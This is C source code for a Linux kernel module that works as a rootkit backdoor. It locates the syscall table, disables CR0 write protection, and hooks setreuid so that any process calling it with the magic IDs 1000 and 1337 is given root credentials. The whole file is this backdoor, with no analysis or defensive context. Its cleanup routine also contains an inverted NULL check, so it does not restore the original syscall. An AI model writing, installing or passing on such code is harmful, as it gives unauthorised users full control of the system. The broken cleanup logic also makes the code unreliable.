#include <linux/kernel.h>
#include <linux/module.h>

#include <linux/unistd.h>
#include <linux/syscalls.h>

unsigned long **sct;

asmlinkage int (*orig_setreuid)(uid_t ruid, uid_t euid);
asmlinkage int new_setreuid(uid_t ruid, uid_t euid)
{
    printk("[trying]: ruid == %d && euid == %d\n", ruid, euid);

    if((ruid == 1000) && (euid == 1337))
    {
        printk("[Correct]: You got the correct ids.\n");
        commit_creds(prepare_kernel_cred(0));

        return new_setreuid(0, 0);
    }

    return orig_setreuid(ruid, euid);
}

static unsigned long **aquire_sct(void)
{
    unsigned long int offset = PAGE_OFFSET;
    unsigned long **sct;

    while(offset < ULLONG_MAX)
    {
        sct = (unsigned long **)offset;
        if(sct[__NR_close] == (unsigned long *)sys_close)
        {
            printk("Succeeded to get sys_call_table!\n");
            return sct;
        }

        offset += sizeof(void *);
    }

    printk("Failed to get sys_call_table!\n");

    return NULL;
}

static void disable_page_protection(void)
{
    unsigned long value;
    asm volatile("mov %%cr0, %0" : "=r" (value));

    if(!(value & 0x00010000))
        return;

    asm volatile("mov %0, %%cr0" : : "r" (value & ~0x00010000));
}

static void enable_page_protection(void)
{
    unsigned long value;
    asm volatile("mov %%cr0, %0" : "=r" (value));

    if((value & 0x00010000))
        return;

    asm volatile("mov %0, %%cr0" : : "r" (value | 0x00010000));
}

static int __init r0mod_init(void)
{
    printk("Module starting...\n");

    if(!(sct = aquire_sct()))
        return -1;

    printk("sys_call_table: %lx\n", (unsigned long)sct);

    disable_page_protection();
    {
        orig_setreuid = (void *)sct[__NR_setreuid];
        sct[__NR_setreuid] = (unsigned long**)new_setreuid;
    }
    enable_page_protection();

    return 0;
}

static void __exit r0mod_exit(void)
{
    printk("Module ending...\n");

    if(!sct)
    {
        disable_page_protection();
        {
            sct[__NR_setreuid] = (unsigned long**)orig_setreuid;
        }
        enable_page_protection();
    }
}

MODULE_LICENSE("GPL");
module_init(r0mod_init);
module_exit(r0mod_exit);
